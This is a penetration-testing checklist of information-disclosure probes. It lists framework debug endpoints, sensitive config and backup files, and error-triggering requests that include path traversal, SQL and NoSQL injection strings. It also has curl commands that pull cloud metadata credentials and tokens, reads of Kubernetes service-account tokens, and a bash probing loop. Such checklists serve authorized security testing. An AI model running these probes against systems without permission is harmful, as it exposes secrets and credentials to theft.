# Information Disclosure Probes — Checklist

> Source: Custom — compiled from security research and common patterns

## Framework Debug / Admin Endpoints

### Java / Spring Boot

```
/actuator
/actuator/env
/actuator/health
/actuator/info
/actuator/metrics
/actuator/mappings
/actuator/configprops
/actuator/beans
/actuator/heapdump
/actuator/threaddump
/actuator/loggers
/trace
/env
/dump
/jolokia
/jolokia/list
```

### .NET / ASP.NET

```
/elmah.axd
/trace.axd
/glimpse.axd
/_debug
/swagger
/swagger/v1/swagger.json
```

### PHP

```
/phpinfo.php
/info.php
/php_info.php
/test.php
/i.php
/pi.php
```

### Python (Django / Flask)

```
/_debug
/__debug__/
/debug/default/view
/admin/
/api/debug
/flask/debug
```

### Node.js

```
/status
/debug
/health
/healthcheck
/api/docs
/swagger.json
/api-docs
```

### Ruby on Rails

```
/rails/info
/rails/info/properties
/rails/info/routes
/rails/mailers
```

## Common Sensitive Files

### Configuration / Secrets

```
/.env
/.env.bak
/.env.local
/.env.production
/.env.development
/config.yml
/config.yaml
/config.json
/config.php
/config.inc.php
/configuration.php
/settings.py
/settings.json
/wp-config.php
/wp-config.php.bak
/wp-config.php.old
/wp-config.php.save
/web.config
/appsettings.json
/appsettings.Development.json
/application.yml
/application.properties
/database.yml
/credentials.json
/.npmrc
/.dockerenv
/docker-compose.yml
/Dockerfile
```

### Package Manifests (Dependency Enumeration)

```
/package.json
/package-lock.json
/composer.json
/composer.lock
/Gemfile
/Gemfile.lock
/requirements.txt
/Pipfile
/Pipfile.lock
/pom.xml
/build.gradle
/go.mod
/go.sum
```

### Version Control

```
/.git/config
/.git/HEAD
/.git/index
/.gitignore
/.svn/entries
/.svn/wc.db
/.hg/
/.bzr/
```

### Backup Files

```
/backup.sql
/backup.zip
/dump.sql
/database.sql
/db.sql
/site.tar.gz
/www.zip
/backup/
/*.bak
/*.old
/*.save
/*.swp
/*~
```

## Cloud Metadata Endpoints

### AWS (EC2)

```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data
curl http://169.254.169.254/latest/dynamic/instance-identity/document
```

### GCP

```bash
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Azure (IMDS)

```bash
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### DigitalOcean

```bash
curl http://169.254.169.254/metadata/v1/
curl http://169.254.169.254/metadata/v1/id
```

### Kubernetes

```bash
curl https://kubernetes.default.svc/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -k https://kubernetes.default.svc/api/v1/namespaces
```

## Error / Stack Trace Triggers

```
# Trigger 500 errors to leak stack traces
GET /api/user/../../../../etc/passwd
GET /api/user/undefined
GET /api/user/null
GET /api/user/-1
GET /api/user/9999999999999999999999
GET /api/user/' OR 1=1--
POST /api/user Content-Type: application/json   {"id": []}
POST /api/user Content-Type: application/json   {"id": {"$gt": ""}}
GET /api/user/%00
GET /api/user/%s%s%s%s%s

# Force different Content-Type
POST /api/endpoint
Content-Type: application/xml
<test/>

# Trigger debug mode
GET /api/?debug=true
GET /api/?test=true
GET /api/?trace=true
```

## HTTP Headers to Check

```bash
# Check response headers for info disclosure
run_tool curl -s -I http://target.com/ | grep -iE "server|x-powered|x-aspnet|x-debug|x-runtime|x-version|x-generator"

# Common revealing headers
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319
X-Generator: Drupal 9
X-Runtime: 0.023456
X-Debug-Token: abc123
```

## Robots.txt and Sitemap

```
/robots.txt
/sitemap.xml
/sitemap.xml.gz
/sitemapindex.xml
/humans.txt
/security.txt
/.well-known/security.txt
/crossdomain.xml
/clientaccesspolicy.xml
```

## Testing Automation

```bash
# Probe common info disclosure paths
PATHS=(
  "/.env" "/.git/config" "/phpinfo.php" "/actuator/env"
  "/swagger.json" "/robots.txt" "/wp-config.php.bak"
  "/server-status" "/server-info" "/.svn/entries"
  "/package.json" "/composer.json" "/elmah.axd"
  "/trace.axd" "/api-docs" "/config.yml"
)

TARGET="http://target.com"
for path in "${PATHS[@]}"; do
  CODE=$(run_tool curl -s -o /dev/null -w "%{http_code}" "$TARGET$path")
  if [ "$CODE" != "404" ] && [ "$CODE" != "403" ]; then
    echo "[${CODE}] $TARGET$path"
  fi
done
```
